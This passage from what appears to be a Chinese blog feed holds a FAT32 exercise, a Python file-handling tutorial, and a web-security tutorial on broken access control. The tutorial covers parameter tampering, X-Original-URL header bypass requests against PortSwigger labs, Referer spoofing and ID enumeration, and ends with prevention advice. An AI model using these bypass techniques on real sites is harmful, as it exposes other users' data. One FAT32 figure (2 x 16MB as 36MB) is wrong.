号表项可能被用于记录“脏标志”，以说明文件系统没有被正常卸载或者磁盘表面存在错误。不过此值似乎不重要，正常情况下，1号表项为:“FFFFFFFF”或“FFFFFF0F”（当然，这里是直接看上去，如果说其值的话，需要按照小端模式读出来，“0xFFFFFFFF”或“0x0FFFFFFF”）</li></ul><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423135739.png"alt="FAT32 实例" /><figcaption aria-hidden="true">FAT32 实例</figcaption></figure><p>那么这个 FAT32 表有几个文件呢？ 答案是: 10 个文件.这里就不详细介绍了，根据 FAT16 的实例和上面 FAT32的格式说明，应该很容易理解。</p><h2 id="计算公式">计算公式</h2><ol type="1"><li><p>已知簇号，如何找到对应的扇区号？</p><p><code>logic_sector_sn=(kown_cluster_sn-2)*Sector_per_cluster+DATA_begin_sector_sn</code><code>逻辑扇区号 = (已知簇号 - 2) * 每簇的扇区数 + DATA 区起始扇区号</code></p><p>已知簇号 - 2 的是因为要求逻辑扇区号(即: 相对于 DBR 区的扇区号)，而DATA 区默认从 2 簇开始。</p></li><li><p>FAT 表的入口地址 ＝ 隐藏扇区数 + 保留扇区数</p></li></ol><p>适用于 FAT16:</p><ol type="1"><li>根目录区的入口地址 = FAT 表的入口地址 + 所有 FAT 的扇区数</li><li>DATA 数据区的入口地址 = 根目录区的入口地址 + 根目录区的扇区数</li></ol><p>适用于 FAT32:</p><ol type="1"><li>DATA 数据区的入口地址 = FAT 表的入口地址 + 所有 FAT 的扇区数</li><li>根目录区（FDT）的入口地址 = DATA 区起始扇区号 + (首簇号 -2)*每簇的扇区数</li></ol><h2 id="习题">习题</h2><ol type="1"><li>设：簇空间设置为每簇 512B，分区大小为 16GB，即 FAT32 表占多少空间？最大簇号为 16GB/512B = 16*(2^30)/512 = 33 554 432 FAT32 表项为每个簇占 4个字节，即 33 554 432 x 4B = 128MB 2 个 FAT32 表，即 2 x 128MB =256MB</li><li>设：簇空间设置为每簇 4KB，分区大小为 16GB，即 FAT32 表占多少空间？最大簇号为 16GB/4KB=4 194 304<br />FAT32 表项为每个簇占 4 个字节，即 4 194 304 x 4B = 16MB 2 个 FAT32表，即 2 x 16MB = 36MB</li><li>访问时间效率通过比较文件所占簇的个数来实现</li></ol><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="http://www.360doc.com/content/19/1029/09/1367418_869698315.shtml">FAT32文件格式示例解析</a></li><li><ahref="https://example61560.files.wordpress.com/2016/06/fat.pdf">数据恢复之Fat 篇</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Computer </tag>
            
            <tag> FAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>访问控制与越权</title>
      <link href="/blog/2020/03/25/websec/logic_vuln/access_control/"/>
      <url>/blog/2020/03/25/websec/logic_vuln/access_control/</url>
      
        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1><p>访问控制往往是漏洞的高发地带，而且往往是危害严重。时至今日，最新版的OWASP 2017 top 10 中 Broken Access Control 仍位居第五。</p><p>本文将讨论访问控制安全，讲述越权以及那些由访问控制不当而导致的漏洞，最后总结如何避免这些漏洞，下面我们先来了解以下三个概念以及他们之间的关系。</p><h2 id="three-concepts">Three Concepts</h2><ul><li><p>身份验证 ( 认证)：鉴别用户身份，确定该用户与他自己所声称的身份一致。 Authenticationidentifies the user and confirms that they are who they say theyare.</p></li><li><p>会话管理：确定后续的 HTTP 请求是由与之前相同的用户发出。 Sessionmanagement identifies which subsequent HTTP requests are being made bythat same user.</p></li><li><p>访问控制确定是否允许用户执行他们尝试执行的操作。 Access controldetermines whether the user is allowed to carry out the action that theyare attempting to perform.</p></li></ul><blockquote><p>从逻辑上讲，应用程序核心安全机制的访问控制建立在<strong>验证和会话管理</strong>之上，尤其是在Web应用程序的上下文环境中更是如此。应用程序通过验证机制来核实用户身份，并通过会话管理来保证它收到的一系列请求由该用户发出。应用程序之所以需要这样做，至少从安全上讲，是因为它必须决定是否允许某个请求执行特定的<strong>操作</strong>或访问它请求的<strong>资源</strong>。访问控制是应用程序的一个重要防御机制，因为它们负责做出这些关键决定。如果访问控制存在缺陷，攻击者往往能够攻破整个应用程序，控制其管理功能并访问属于其他用户的敏感数据。</p><p>当然，即使是应用程序做出一切努力执行稳定的验证与会话管理机制，但由于没有在它们上面建立任何有效的访问控制，这方面的投资也就相当于白白浪费了，这种情况非常常见。这些漏洞如此普遍的一个原因在于，需要对每一个请求，以及特殊用户在特定时刻尝试对资源执行的每一项操作执行访问控制检查。</p><p>而且，与许多其他类型的控制不同，访问控制的设计和管理是一个复杂而动态变化的问题，它需要将复杂的业务逻辑，组织和法律约束等用技术实现，而每个企业业务、法律约束、组织规范又都是不一样的。这导致访问控制的设计决策必须由人决定，而无法采用技术来解决。也因此，越权漏洞很难通过扫描工具发现出来，往往需要通过手动进行测试。</p></blockquote><p>注意： 上面三段这么深刻（肯定不是我写的），基本选自《黑客攻防技术宝典Web 实战篇（第 2 版）》</p><h3 id="examples">Examples</h3><p>你通过更改 id来实现查看别的资料等，应用程序验证了你是你，然后通过会话管理机制确保了该请求是由你发出，但是由于权限控制没做到位，没有限制你访问别人的资料，进而就产生了这个漏洞。</p><h2 id="access-control">Access Control</h2><p>访问控制是指在应用程序中，对用户尝试执行的<strong>操作</strong>或尝试请求的<strong>资源</strong>的控制。换句话说，当攻击者可以访问或修改他们本不可访问的<strong>对象</strong>（例如文件,数据库记录，帐户等）或使用一些其本不该具有的<strong>功能</strong>，就存在访问控制漏洞。</p><p>并附上 OWSAP 对有缺陷的权限控制的描述：</p><blockquote><p><ahref="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control"><strong>BrokenAccess Control</strong></a>. Restrictions on what authenticated usersare allowed to do are often not properly enforced. Attackers can exploitthese flaws to access unauthorized functionality and/or data, such asaccess other users’ accounts, view sensitive files, modify other users’data, change access rights, etc.</p></blockquote><p>可以将访问控制分为三类：</p><ol type="1"><li>垂直权限访问控制（Vertical access controls）</li><li>水平权限访问控制（Horizontal access controls）</li><li>基于上下文的访问控制（Context-dependent access controls）</li></ol><h2 id="vertical-access-controls">Vertical access controls</h2><p>访问控制是建立用户角色与权限之间的关系，</p><p>垂直访问控制是一种基于角色的访问控制（RBAC，Role Based AccessControl），它是指将系统中的用户的权限以角色（Role）划分，根据角色来限制可使用的敏感功能点。通过垂直访问控制，不同类型的用户可以访问不同的应用程序功能。垂直访问控制是安全模型的更加细粒度的实现，这些安全模型旨在将企业策略等付诸实践，例如职责和最低特权的分离。</p><h3 id="example">Example</h3><p>在一个论坛中，有管理员、普通用户、游客三种角色，管理员有删除、编辑、置顶帖子的权限，普通用户有评论和浏览帖子的权限，游客只有浏览帖子的权限。目前已有Shiro，Spring Security 等基于 RBAC模型的成熟框架来处理功能权限管理和鉴权的问题。</p><h2 id="horizontal-access-controls">Horizontal access controls</h2><p>水平访问控制是一种基于数据的访问控制，它通过限制特定用户访问其对应的特定资源来实现。通过水平访问控制，不同的用户可以访问相同类型的资源的子集。例如，银行业务应用程序将允许用户查看自己的交易并从自己的帐户进行付款，但不能查看其他任何用户的帐户。</p><h3 id="example-1">Example</h3><p>同属于普通用户角色的用户 A 和用户B，正常情况下，他们只能访问自己的私有数据，例如：修改/查看个人详细资料、增加/查看/删除个人订单、查看/删除个人邮件等。</p><h2 id="context-dependent-access-controls">Context-dependent accesscontrols</h2><p>基于上下文的访问控制根据应用程序的状态或用户与应用程序的交互来限制对功能和资源的访问。</p><p>上下文相关的访问控制可防止用户以错误的顺序执行操作。例如，零售网站可能会阻止用户在付款后修改购物车中的内容。找回密码过程中，不能</p><h3 id="examples-1">Examples</h3><p>在购物网站的付款的多阶段过程：（添加购物车 -&gt; ）点击购买 -&gt;下订单 -&gt; 付款 -&gt; 确认订单； 在找回密码的多阶段过程：(用户名-&gt;) 手机号/邮箱 -&gt; 验证码 -&gt;新密码；需要确保前后的数据等的一致性以及按顺序进行。</p><h1 id="vertical-privilege-escalation">Vertical privilegeescalation</h1><p>如果用户可以使用那些他们不被允许使用的功能，那这就是垂直越权。例如：如果非管理用户可以访问可以具有删除用户帐户功能的管理页面，则这是垂直越权。</p><h2 id="unprotected-functionality">Unprotected functionality</h2><p>在最基本的情况下，如果应用程序不对敏感功能实施任何保护，则会出现垂直越权。例如：管理员的欢迎页面中链接着管理功能，而用户的欢迎页面就没有。但是，用户可能可以通过直接访问浏览相关的管理URL ，就能访问管理功能。</p><p>例如：一个网站在以下的 URL 中存在着敏感功能点：<code>https://insecure-website.com/admin</code></p><p>实际上，在该网站中，不仅是在其用户界面中存在该功能链接的管理员，任何用户都可以访问此目录。在某些情况下，管理 URL 可能会在其他位置泄露，例如 robots.txt 文件：<code>https://insecure-website.com/robots.txt</code> 如果 URL没有在任何地方都没有泄露，攻击者还可以跑字典来暴力破解敏感功能点的位置。</p><p><ahref="https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality">LAB:Unprotected admin functionality</a></p><h2 id="parameter-based-access-control-methods">Parameter-based accesscontrol methods</h2><p>某些应用程序在登录时确定用户的访问权限或角色，然后将此信息存储在用户可控制的位置，例如隐藏字段，cookie或预设查询字符串参数。 应用程序根据提交的值做出后续的访问控制决策。例如：<code>https://insecure-website.com/login/home.jsp?admin=true</code><code>https://insecure-website.com/login/home.jsp?role=1</code></p><p>这种方法从根本上来说是不安全的，因为用户可以简单地修改值，然后就获得对未经授权的功能（例如管理功能）的访问权限。</p><p><ahref="https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter">LAB：Userrole controlled by request parameter</a></p><p><ahref="https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile">LAB：Userrole can be modified in user profile</a></p><h2id="broken-access-control-resulting-from-platform-misconfiguration">Brokenaccess control resulting from platform misconfiguration</h2><p>某些应用程序通过基于用户角色限制对特定 URL 和 HTTP方法的访问来在平台层实施访问控制。例如：一个应用程序可能配置如下规则：</p><blockquote><p>DENY: POST, /admin/deleteUser, managers</p></blockquote><p>该规则拒绝 managers 组中的用户通过 POST 请求访问URL：<code>/ admin / deleteUser</code>，在这种情况下，很多事情都可能会出错，从而导致访问控制被绕过。</p><p>一些应用程序框架支持各种非标准 HTTP 头，它们可用于覆盖原始请求中的URL，例如 X-Original-URL 和 X-Rewrite-URL。如果一个网站使用严格的前端控件来限制基于 URL的访问，但是应用程序允许通过一个请求头覆盖URL，则它可能可以使用如下请求来绕过访问控制：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">X-Original-URL</span><span class="punctuation">: </span>/admin/deleteUser</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><ahref="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented">LAB:URL-based access control can be circumvented</a></p><blockquote><p>注：X-Original-URL 写相对 URL（相对 URL 从 / 开始，表示当前 URL的根目录）， GET 那里写参数 GET 方法指定在提交表单时将参数值追加到 URL请求上。</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?username=carlos</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acf61fbd1f0575ac80b2daf200190016.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=sw017My5iPscUyAzDeCUJEFJiDbuqiom</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Original-URL</span><span class="punctuation">: </span>/admin/delete</span><br></pre></td></tr></table></figure><p>与请求中使用的 HTTP 方法有关的其他攻击也可能会产生。上面的前端控件基于 URL 和 HTTP 方法限制访问。某些网站在执行操作时可以使用其他 HTTP 请求方法。 如果攻击者可以使用GET（或其他）方法对受限制的 URL执行操作，则他们可以规避在平台层实现的访问控制。</p><p><ahref="https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented">LAB:Method-based access control can be circumvented</a></p><h1 id="horizontal-privilege-escalation">Horizontal privilegeescalation</h1><p>当用户能够访问属于其他用户的同种类型资源，而不是他们自己的时，就出现了水平越权。例如：如果一个员工只应该能够访问自己的工作和工资记录，但实际上也可以访问其他员工的记录，那么这就是水平越权。</p><h2 id="classification">Classification</h2><p>其实关于水平越权的分类，没啥标准，这里为啥要提一下呢，主要是便于大家对越权发生的具体场景有一个更加形象具体的了解。本文讲的时候，就不刻意区分了。</p><p>根据对数据的操作分类</p><ol type="1"><li>越权增加（增）</li><li>越权删除（删）</li><li>越权修改（改）</li><li>越权查看（查）</li></ol><p>上面我们讲到水平权限控制是基于数据的访问控制，而对于数据来说，就有：增、删、改、查四种操作方式，因而越权漏洞的成因也主要是因为开发人员在对数据进行增、删、改、查询时，对客户端请求的数据过分相信而遗漏了权限的判定。</p><p>根据数据的对象分类</p><ol type="1"><li>基于用户身份 ID</li><li>基于对象 ID</li><li>基于文件 ID</li></ol><h2 id="test-methods">Test Methods</h2><p>基本：两个账户，两个浏览器，分别登陆，查看对方 id标识，然后改成对方的，测试。</p><h2 id="four-test-scenario">Four Test Scenario</h2><h3 id="id-直接可遍历">id 直接可遍历</h3><p>场景： id 直接就是简单的数字 举例子：</p><ol type="1"><li>使用 Burp 的 intruder 进行遍历</li><li>自己写 py 等脚本遍历</li></ol><h4 id="local-lab">Local lab</h4><p>Webug 和 pikachu 靶场练习</p><h4 id="online-lab">Online lab</h4><p>水平越权攻击可能使用与垂直越权类似的利用方法。例如：用户通常可以使用如下网址来访问自己的帐户页面：<code>https://insecure-website.com/myaccount?id=123</code></p><p>现在，如果攻击者将 id 参数值修改为另一个用户的 ID参数值，则攻击者可能会访问具有相关数据和功能的另一个用户的帐户页面。</p><p><ahref="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter">LAB:User ID controlled by request parameter</a></p><h4 id="cases">Cases</h4><p>越权删除：</p><p><ahref="http://www.onebug.org/wooyundata/6663.html">百度创意专家某功能平行权限漏洞（可删除他人素材）</a></p><p><ahref="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0212974">华住酒店某处越权删除修改用户信息</a></p><p><ahref="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-036411">搜狐白社会任意用户信息修改漏洞</a></p><p>套路：</p><ol type="1"><li>查看自己的删除请求，发现标识自己的 id 参数 --&gt;寻找功能点的请求包， 发现用户标识</li><li>寻找别人的 id 参数，然后拿过来，替换到删除的请求包中，重放包 --&gt;替换为别人的用户标识，重放功能点的请求包</li><li>观察结果</li></ol><p>越权查看、修改：</p><p><ahref="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-033748">Like团用户信息泄露+越权漏洞（可获取大量用户住址联系信息）</a></p><p>越权增加、删除、修改： <ahref="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-033542">爱拍越权漏洞及设计不合理漏洞大礼包（妹子哭了）</a></p><h3 id="id-可逆编码">id 可逆编码</h3><p>举例</p><p>对于 payload， 先编码，再遍历。</p><p>场景：id 类似某种编码，比如：base64 编码， 简单 md5（复杂的解不出来呀emm） 等（需要手动尝试解码，看看能不能解码，解出来是啥）</p><p>方法：</p><ol type="1"><li>使用 Burp 的 intruder 进行编码，遍历</li><li>自己写 py 等脚本遍历</li></ol><h3 id="id-前端-js-加密">id 前端 JS 加密</h3><p>场景：前端 JS 加密 id，比如：ras，aes 加密等</p><p>方法： 浏览器开发者工具 JS 断点调试，找出加密前的值，进行手动修改找到加密方法后，可以写脚本遍历。</p><h3 id="id-不可遍历">id 不可遍历</h3><h2 id="online-lab-1">Online Lab</h2><p>在某些应用程序中，可利用参数的值并不可预测。例如，应用程序可以使用全局唯一标识符（GUID）来标识用户，而不是递增数字。在这里，攻击者可能无法猜测或预测另一个用户的标识符。但是，属于其他用户的 GUID可能会在引用用户的应用程序的其他位置泄露，例如用户消息或评论。</p><p><ahref="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids">LAB:User ID controlled by request parameter, with unpredictable userIDs</a></p><p>在某些情况下，应用程序会检测到何时不允许用户访问资源，并将其重定向返回到登录页面。但是，包含重定向的响应可能仍然包含一些属于目标用户的敏感数据，因此攻击仍然是成功。</p><p><ahref="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect">LAB:User ID controlled by request parameter with data leakage inredirect</a></p><h2 id="real-bug-hunting">Real Bug Hunting</h2><h1 id="horizontal-to-vertical-privilege-escalation">Horizontal tovertical privilege escalation</h1><p>通常情况下，通过攻击权限较高的用户，可以将水平越权转变为垂直越权。例如：水平越权可能允许攻击者重置或获取属于另一个用户的密码。如果攻击者以管理员用户为目标并攻击了他们的帐户，那他们便可以获得管理员权限，因此可以进行垂直越权。</p><p>例如，攻击者也许可以使用在前面针对水平越权已经讲述过的参数篡改技术来访问另一个用户的帐户页面：</p><p><code>https://insecure-website.com/myaccount?id=456</code></p><p>如果目标用户是应用程序管理员，则攻击者将获得对管理帐户页面的访问权限。此页面可能泄露管理员密码或提供修改密码的手段，又或者可能提供对特权功能的直接访问。</p><h1 id="insecure-direct-object-references">Insecure direct objectreferences</h1><p>不安全的直接对象引用（IDOR）是访问控制漏洞的一个子类别。当应用程序使用用户提供的输入直接访问对象，并且攻击者可以修改输入以获得未经授权的访问时，就会发生IDOR。 它以其在 OWASP 2007 Top 10中的出现而得到普及，尽管它只是许多实现出错的一个例子，该错误可能导致访问控制被规避，从而实现越权。</p><p><ahref="https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references">LAB:Insecure direct object references</a></p><blockquote><p>Read more <ahref="https://portswigger.net/web-security/access-control/idor">Insecuredirect object references (IDOR)</a></p></blockquote><h1 id="access-control-vulnerabilities-in-multi-step-processes">Accesscontrol vulnerabilities in multi-step processes</h1><p>许多网站通过一系列步骤来实现重要功能。当需要获取各种输入或选项时，或者当用户需要在执行操作之前查看并确认详细信息时，通常会这样做。例如，用于更新用户详细信息的管理功能可能涉及以下步骤：</p><ol type="1"><li>加载包含特定用户的详细信息的表单；</li><li>提交更改；</li><li>查看更改并确认。</li></ol><h2 id="procedure-based-access-control">Procedure-based accesscontrol</h2><p>有时，网站会对其中某些步骤实施严格的访问控制，而忽略其他步骤。例如，假设第一步和第二步已经正确实行了访问控制，但第三步却没有。实际上，该网站假定用户只有完成了具有恰当访问权限控制的第一步之后，才可以进入第3 步。在这里，攻击者可以跳过前两个步骤并直接使用所需参数提交对第三步的请求，从而获得未经授权的功能访问。（实际测试时，并不知道这样，需要先过一遍步骤，记录每一步的请求包，然后自己根据数据包（请求以及相应）作出假设，并进行测试验证，是否存在这样的漏洞。）</p><p><ahref="https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step">LAB:Multi-step process with no access control on one step</a></p><h2 id="referer-based-access-control">Referer-based access control</h2><p>某些网站的访问控制基于 HTTP 请求中提交的 Referer 头。通常，浏览器会将 Referer 标头添加到请求中，以指示发起请求的页面。</p><p>例如，假设应用程序对<code>/admin</code>上的主管理页面实施了很好的访问控制，但是对于子页面（例如<code>/admin/deleteUser</code>）仅检查Referer 标头。 如果 Referer 头包含主要的 <code>/admin</code>URL，则允许该请求。</p><p>在这种情况下，由于 Referer头可以被攻击者完全控制，因此他们可以直接伪造对敏感子页面的请求，提供所需的Referer 头，从而获得未经授权的访问。</p><p><ahref="https://portswigger.net/web-security/access-control/lab-referer-based-access-control">LAB:Referer-based access control</a></p><h2 id="location-based-access-control">Location-based accesscontrol</h2><p>一些网站根据用户的地理位置对资源实施访问控制。例如，这可以适用于那些有国家法律或企业业务限制的银行应用程序或媒体服务等。这些访问控制通常可以通过使用 Web 代理，VPN或修改客户端地理定位机制来规避。</p><h1 id="how-to-prevent-access-control-vulnerabilities">How to preventaccess control vulnerabilities</h1><p>通常，可以采取 <ahref="https://www.forcepoint.com/cyber-edu/defense-depth">纵深防御</a>方法并应用以下原则来防止访问控制漏洞：</p><ul><li>不要通过隐藏来进行访问控制。</li><li>除非打算公开访问资源，否则默认拒绝访问。</li><li>尽可能使用单个应用程序范围的机制来执行访问控制。</li><li>在代码级别，使开发人员必须声明每个资源允许的访问权限，并默认拒绝访问。</li><li>彻底审核和测试访问控制，以确保它们按设计工作。</li></ul><h1 id="参考与推荐">参考与推荐</h1><blockquote><ol type="1"><li><ahref="https://zhuanlan.zhihu.com/p/41377443">安全设计的一些实践</a></li><li>《数据安全架构设计与实战》</li><li><ahref="https://cloud.tencent.com/developer/article/1099266">权限控制的解决方式(科普向)</a></li><li><ahref="https://cloud.tencent.com/developer/article/1367399">业务逻辑漏洞探索之越权漏洞</a></li></ol></blockquote><h1 id="乌云镜像">乌云镜像</h1><p><a href="http://wy.zone.ci">镜像 1</a> <a href="http://xss.one/">镜像2</a> <a href="http://www.onebug.org">镜像 3</a> <ahref="https://www.madebug.net/">镜像 4</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> logic_vuln </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 文件操作基础</title>
      <link href="/blog/2020/03/22/programming/python/2.object-oriented/file_basic/"/>
      <url>/blog/2020/03/22/programming/python/2.object-oriented/file_basic/</url>
      
        <content type="html"><![CDATA[<h2 id="文件的概念">文件的概念</h2><h3 id="文件的概念和作用">1.1 文件的概念和作用</h3><ul><li>计算机的 <strong>文件</strong>，就是存储在某种<strong>长期储存设备</strong> 上的一段 <strong>数据</strong></li><li>长期存储设备包括：硬盘、U 盘、移动硬盘、光盘...</li></ul><p>文件的作用: 将数据长期保存下来，在需要的时候使用</p><h3 id="文件的存储方式">文件的存储方式</h3><ul><li>在计算机中，文件是以 <strong>二进制</strong>的方式保存在磁盘上的</li></ul><h4 id="文本文件和二进制文件">文本文件和二进制文件</h4><ul><li>文本文件<ul><li>可以使用 <strong>文本编辑软件</strong> 查看</li><li>本质上还是二进制文件</li><li>例如：python 的源程序</li></ul></li><li>二进制文件<ul><li>保存的内容 不是给人直接阅读的，而是<strong>提供给其他软件使用的</strong></li><li>例如：图片文件、音频文件、视频文件等等</li><li>二进制文件不能使用 <strong>文本编辑软件</strong> 查看</li></ul></li></ul><h2 id="文件的基本操作">02. 文件的基本操作</h2><h3 id="操作文件的套路">2.1 操作文件的套路</h3><p>在 <strong>计算机</strong>中要操作文件的套路非常固定，一共包含<strong>三个步骤</strong>：</p><ol type="1"><li>打开文件</li><li>读、写文件<ul><li><strong>读</strong> 将文件内容读入内存</li><li><strong>写</strong> 将内存内容写入文件</li></ul></li><li>关闭文件</li></ol><h3 id="操作文件的函数方法">2.2 操作文件的函数/方法</h3><ul><li>在 <code>Python</code> 中要操作文件需要记住 1 个函数和 3 个方法</li></ul><table><thead><tr class="header"><th style="text-align: left;">序号</th><th style="text-align: left;">函数/方法</th><th style="text-align: left;">说明</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">01</td><td style="text-align: left;">open</td><td style="text-align: left;">打开文件，并且返回文件操作对象</td></tr><tr class="even"><td style="text-align: left;">02</td><td style="text-align: left;">read</td><td style="text-align: left;">将文件内容读取到内存</td></tr><tr class="odd"><td style="text-align: left;">03</td><td style="text-align: left;">write</td><td style="text-align: left;">将指定内容写入文件</td></tr><tr class="even"><td style="text-align: left;">04</td><td style="text-align: left;">close</td><td style="text-align: left;">关闭文件</td></tr></tbody></table><ul><li><code>open</code> 函数负责打开文件，并且返回文件对象</li><li><code>read</code>/<code>write</code>/<code>close</code>三个方法都需要通过 <strong>文件对象</strong> 来调用</li></ul><h3 id="read-方法-读取文件">2.3 read 方法 —— 读取文件</h3><p>Python file method <strong>read()</strong> reads at most<em>size</em> bytes from the file. If the read hits EOF before obtainingsize bytes, then it reads only available bytes.</p><p>Following is the syntax for <strong>read()</strong> method −</p><blockquote><p>fileObject.read( size );</p></blockquote><p><strong>Parameters</strong></p><ul><li><strong>size</strong> − This is the number of bytes to be read fromthe file.</li></ul><p><strong>Return Value</strong></p><p>This method returns the bytes read in string.</p><p>即：read 有一个可选参数：读取的字符个数，如果不写，默认读取到 EOF截止。返回一个字符串（包含读取的内容）</p><ul><li><p><strong>open函数的第一个参数是要打开的文件名（文件名区分大小写）</strong></p><p>对于读取模式 r 来说，</p><ul><li>如果文件 <strong>存在</strong>，返回<strong>文件操作对象</strong></li><li>如果文件 <strong>不存在</strong>，会 <strong>抛出异常</strong></li></ul><p>而对于写模式 w 与追加模式 a来说，如果文件不存在则会新建文件，并不会抛出异常。</p></li><li><p><code>read</code> 方法可以一次性 <strong>读入</strong> 并<strong>返回</strong> 文件的 <strong>所有内容</strong></p></li><li><p>close 方法负责关闭文件</p><ul><li>如果<strong>忘记关闭文件</strong>，<strong>会造成系统资源消耗，而且会影响到后续对文件的访问</strong></li></ul></li><li><p><strong>注意</strong>：<code>read</code> 方法执行后，会把<strong>文件指针</strong> 移动到 <strong>文件的末尾</strong></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 打开 - 文件名需要注意大小写</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;README&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 读取</span></span><br><span class="line">text = file.read()</span><br><span class="line"><span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 关闭</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p><strong>提示</strong></p><ul><li>在开发中，通常会先编写 <strong>打开</strong> 和<strong>关闭</strong> 的代码，再编写中间针对文件的<strong>读/写</strong> 操作！</li></ul><h4 id="文件指针知道">文件指针（知道）</h4><ul><li><strong>文件指针</strong> 标记<strong>从哪个位置开始读取数据</strong></li><li><strong>第一次打开</strong> 文件时，通常<strong>文件指针会指向文件的开始位置</strong>(如果以追加方式打开，文件指针在末尾)</li><li>当执行了 read 方法后，文件指针会移动到读取内容的末尾<ul><li>默认情况下会移动到 <strong>文件末尾</strong></li></ul></li></ul><p><strong>思考</strong></p><ul><li>如果执行了一次 <code>read</code> 方法，读取了所有内容，那么再次调用<code>read</code> 方法，还能够获得到内容吗？</li></ul><p><strong>答案</strong></p><ul><li>不能</li><li>第一次读取之后，文件指针移动到了文件末尾，再次调用不会读取到任何的内容</li></ul><h3 id="打开文件的方式">2.4 打开文件的方式</h3><ul><li><code>open</code> 函数默认以 <strong>只读方式</strong>打开文件，并且返回文件对象</li></ul><p>语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;文件名&quot;</span>, <span class="string">&quot;访问方式&quot;</span>)</span><br></pre></td></tr></table></figure><table><colgroup><col style="width: 7%" /><col style="width: 92%" /></colgroup><thead><tr class="header"><th style="text-align: center;">访问方式</th><th style="text-align: left;">说明</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">r</td><tdstyle="text-align: left;">以<strong>只读</strong>方式打开文件。文件的指针将会放在文件的开头，这是<strong>默认模式</strong>。如果文件不存在，抛出异常</td></tr><tr class="even"><td style="text-align: center;">w</td><tdstyle="text-align: left;">以<strong>只写</strong>方式打开文件。如果文件存在会被覆盖。如果文件不存在，创建新文件</td></tr><tr class="odd"><td style="text-align: center;">a</td><tdstyle="text-align: left;">以<strong>追加</strong>方式打开文件。如果该文件已存在，文件指针将会放在文件的结尾。如果文件不存在，创建新文件进行写入</td></tr><tr class="even"><td style="text-align: center;">r+</td><tdstyle="text-align: left;">以<strong>读写</strong>方式打开文件。文件的指针将会放在文件的开头。如果文件不存在，抛出异常</td></tr><tr class="odd"><td style="text-align: center;">w+</td><tdstyle="text-align: left;">以<strong>读写</strong>方式打开文件。如果文件存在会被覆盖。如果文件不存在，创建新文件</td></tr><tr class="even"><td style="text-align: center;">a+</td><tdstyle="text-align: left;">以<strong>读写</strong>方式打开文件。如果该文件已存在，文件指针将会放在文件的结尾。如果文件不存在，创建新文件进行写入</td></tr></tbody></table><p><strong>提示</strong></p><ul><li>频繁的移动文件指针，<strong>会影响文件的读写效率</strong>，开发中更多的时候会以<strong>只读</strong>、<strong>只写</strong> 的方式来操作文件</li></ul><p><strong>写入文件示例</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 